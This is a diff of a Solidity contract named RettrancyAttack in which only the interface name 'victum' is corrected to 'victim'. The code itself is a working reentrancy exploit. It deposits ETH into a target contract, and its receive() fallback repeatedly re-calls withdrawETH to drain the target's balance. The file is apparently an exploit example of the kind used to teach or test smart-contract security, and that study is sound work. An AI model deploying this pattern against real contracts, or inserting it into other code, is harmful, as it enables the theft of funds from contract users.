@@ -1,30 +1,30 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.7.0;
 
-interface victum {
+interface victim {
     function depositETH() external payable;
 
     function withdrawETH(uint256) external;
 }
 
 contract RettrancyAttack {
-    victum Victum;
+    victim Victim;
 
     constructor(address addr) {
-        Victum = victum(addr);
+        Victim = victim(addr);
     }
 
     function deposit() public payable {
-        Victum.depositETH{value: msg.value}();
+        Victim.depositETH{value: msg.value}();
     }
 
     function withdrawETH(uint256 amount) public {
-        Victum.withdrawETH(amount);
+        Victim.withdrawETH(amount);
     }
 
     receive() external payable {
-        if (address(Victum).balance > 1 ether) {
-            Victum.withdrawETH(1 ether);
+        if (address(Victim).balance > 1 ether) {
+            Victim.withdrawETH(1 ether);
         }
     }
 }
